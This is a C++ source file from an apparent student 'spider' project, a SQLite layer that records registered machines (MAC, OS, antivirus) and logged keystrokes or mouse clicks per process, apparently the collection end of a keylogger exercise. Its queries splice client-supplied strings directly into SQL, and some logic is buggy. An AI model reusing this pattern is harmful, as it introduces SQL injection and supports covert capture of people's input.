/*
** Sqlite.cpp for cpp_spider in /home/god/TEK3/C++/cpp_spider/sources/Database/Sqlite.cpp
**
** Made by Maxime PILLON
** Login   <maxime.pillon@epitech.eu>
**
** Started on  Tue Sep 26 13:02:39 2017 Maxime PILLON
** Last update Tue Sep 26 13:02:39 2017 Maxime PILLON
*/

#include	<iostream>
#include	<sstream>
#include <Protocol/Serializer.hpp>
#include	"logger/Logger.hpp"
#include	"Database/Sqlite.hpp"

static bool	isInDb = false;

static int	callback(void *data, int argc, char **argv, char **azColName)
{
  static_cast<void>(data);
  static_cast<void>(argc);
  static_cast<void>(argv);
  static_cast<void>(azColName);
  isInDb = true;
  return (0);
}

spider::Sqlite::Sqlite() {}

spider::Sqlite::~Sqlite() {}

bool	spider::Sqlite::open(const char *filename)
{
  int	rc;

  rc = sqlite3_open(filename, &_db);
  if (rc)
  {
    std::cerr << "Can't open database: " << sqlite3_errmsg(_db) << std::endl;
    return false;
  }
  else
    return true;
}

void spider::Sqlite::close()
{
  sqlite3_close(_db);
}

void spider::Sqlite::createDb()
{
  logger::Logger	&logger  = logger::Logger::getLogger();

  logger.log(logger::INFO, "Generate DB");
  execute(     "CREATE TABLE IF NOT EXISTS `register` (" \
	       "`mac` varchar(255)," \
	       "`os` varchar(255) DEFAULT NULL," \
	       "`antivirus` varchar(255) DEFAULT NULL" \
	       ");" \
	       "CREATE TABLE IF NOT EXISTS `log` (" \
	       "  `id` INTEGER PRIMARY KEY AUTOINCREMENT," \
	       "  `time` timestamp DEFAULT NULL," \
	       "  `process` varchar(255) DEFAULT NULL," \
	       "  `message` longtext DEFAULT NULL" \
	       "  );");
}

void	spider::Sqlite::execute(const char *querry)
{
  int	rc;
  char *zErrMsg = nullptr;

  rc = sqlite3_exec(_db, querry, callback, (void*)_data, &zErrMsg);

  if( rc != SQLITE_OK ) {
    fprintf(stderr, "SQL error: %s\n", zErrMsg);
    sqlite3_free(zErrMsg);
  } else {
    fprintf(stdout, "Operation done successfully\n");
  }
}

void spider::Sqlite::addEntryRegister(const char *mac, const char *os,
				      const char *antivirus)
{
  std::ostringstream 	strstream;
  std::string		querry;
  logger::Logger	&logger  = logger::Logger::getLogger();

  strstream << "SELECT * FROM register WHERE mac IS '" << mac << "';";
  querry = strstream.str();
  execute(querry.c_str());
  if (isInDb)
  {
    isInDb = false;
    return ;
  }
  strstream.clear();
  querry.clear();
  logger.log(logger::DEBUG, "Pushing one entry register");
  strstream << "INSERT INTO register (mac, os, antivirus) VALUES ('" << mac << "', '" << os << "', '" << antivirus << "');";
  querry = strstream.str();
  execute(querry.c_str());
}

void spider::Sqlite::removeEntryRegister(int id)
{
  std::ostringstream strstream;
  std::string		querry;

  strstream <<  "DELETE FROM register WHERE id='" << id << "'";
  querry = strstream.str();

  execute(querry.c_str());
}

void spider::Sqlite::pushData(t_unserialized data)
{
  logger::Logger	&logger  = logger::Logger::getLogger();

  logger.log(logger::DEBUG, "Pushing data to DB.");
  if (data.register_)
    addEntryRegister(data.register_->mac.c_str(),
		     data.register_->os.c_str(),
		     data.register_->antivirus.c_str());
  else if (data.message)
    addEntryLog(data.message->timestamp.c_str(),
		data.message->process.c_str(),
		data.message->data.c_str());
  else
  {
    std::ostringstream strstream;

    logger.log(logger::DEBUG, "Pushing data click data.");
    strstream << "Click on " << spider::Serializer::getSerializer().get_string_from_keytype(data.mouse->keytype) <<
	      ", at position x: " << data.mouse->x <<
	      ", and y: " << data.mouse->y << "." << std::endl;

    logger.log(logger::DEBUG, strstream.str());
    std::cout << strstream.str() << std::endl;
    addEntryLog(data.mouse->timestamp.c_str(),
		data.mouse->process.c_str(),
		strstream.str().c_str());
  }

}

void spider::Sqlite::addEntryLog(const char *time, const char *proccess,
			      const char *message)
{
  std::ostringstream	strstream;
  std::string		querry;
  logger::Logger	&logger  = logger::Logger::getLogger();

  logger.log(logger::DEBUG, "Pushing one entry log");
  strstream << "INSERT INTO log (time, process, message) VALUES ('" << time << "', '" << proccess << "', '" << message << "');";
  querry = strstream.str();
  execute(querry.c_str());
}

void spider::Sqlite::dropDb()
{
  execute(     "DROP TABLE IF EXISTS `register`;" \
	       "DROP TABLE IF EXISTS `log`;");
}

void spider::Sqlite::removeEntryLog(int id)
{
  std::ostringstream strstream;
  std::string		querry;

  strstream <<  "DELETE FROM log WHERE id='" << id << "'";
  querry = strstream.str();

  execute(querry.c_str());
}

void spider::Sqlite::treat(unserialized_queue &toTreat)
{
  while (!toTreat.empty())
  {
    pushData(toTreat.front());
    toTreat.pop();
  }
}